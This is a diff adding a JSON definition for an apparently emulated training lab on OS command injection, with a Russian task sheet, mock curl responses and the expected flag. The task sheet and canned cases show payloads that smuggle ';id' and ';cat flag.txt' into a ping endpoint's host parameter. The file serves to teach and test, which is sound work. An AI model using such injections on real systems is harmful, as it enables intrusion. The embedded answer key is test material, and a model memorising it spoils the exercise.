@@ -1,0 +1,42 @@
+{
+  "id": "web-command-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{c0mm4nd_1nj3ct10n_1s_st1ll_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: инъекция команд ОС\n\nЦель — `http://shop.lab.local/ping?host=`. Приложение «пингует» хост, подставляя\nзначение параметра в системную команду. Проверь и выполни свою команду.\n\n1. Обычный запрос: `curl -s 'http://shop.lab.local/ping?host=127.0.0.1'`.\n2. Добавь разделитель и свою команду. В URL `;` и пробел нужно закодировать,\n   поэтому удобнее `curl --data-urlencode` + `-G`:\n\n   curl -s -G 'http://shop.lab.local/ping' --data-urlencode 'host=127.0.0.1;id'\n\n3. Выполни чтение файла с флагом (в рабочем каталоге приложения лежит `flag.txt`):\n\n   curl -s -G 'http://shop.lab.local/ping' --data-urlencode 'host=127.0.0.1;cat flag.txt'\n\n4. Запиши флаг в `found.txt` и набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция shop.lab.local/ping)",
+      "cases": [
+        {
+          "match": "cat\\s+flag\\.txt",
+          "example": "-s -G http://shop.lab.local/ping --data-urlencode 'host=127.0.0.1;cat flag.txt'",
+          "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=65 time=0.044 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.044/0.044/0.044/0.000 ms\nnto{c0mm4nd_1nj3ct10n_1s_st1ll_rce}\n"
+        },
+        {
+          "match": "[;&|]\\s*id",
+          "example": "-s -G http://shop.lab.local/ping --data-urlencode 'host=127.0.0.1;id'",
+          "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=65 time=0.057 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.057/0.057/0.057/0.000 ms\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\n"
+        },
+        {
+          "match": "host=",
+          "example": "-s 'http://shop.lab.local/ping?host=127.0.0.1'",
+          "output": "PING 127.0.0.1 (127.0.0.1) 56(84) bytes of data.\n64 bytes from 127.0.0.1: icmp_seq=1 ttl=65 time=0.030 ms\n\n--- 127.0.0.1 ping statistics ---\n1 packets transmitted, 1 received, 0% packet loss, time 0ms\nrtt min/avg/max/mdev = 0.030/0.030/0.030/0.000 ms\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /ping на shop.lab.local (параметр host).\n"
+    }
+  }
+}
